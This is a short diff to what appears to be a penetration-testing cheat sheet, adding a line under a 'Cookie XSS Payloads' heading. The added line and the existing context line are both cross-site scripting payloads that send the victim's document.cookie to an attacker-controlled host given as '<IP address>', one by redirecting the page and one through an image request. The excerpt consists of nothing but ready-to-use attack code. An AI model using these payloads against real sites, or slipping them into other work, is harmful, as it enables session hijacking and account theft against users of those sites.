@@ -493,6 +493,7 @@ CTRL + U
 - Cookie XSS Payloads
 
 ```
+<script>document.location='http://<IP address>/index.php?c='+document.cookie;</script>
 <script>new Image().src='http://<IP address>/index.php?c='+document.cookie</script>	
 ```
 
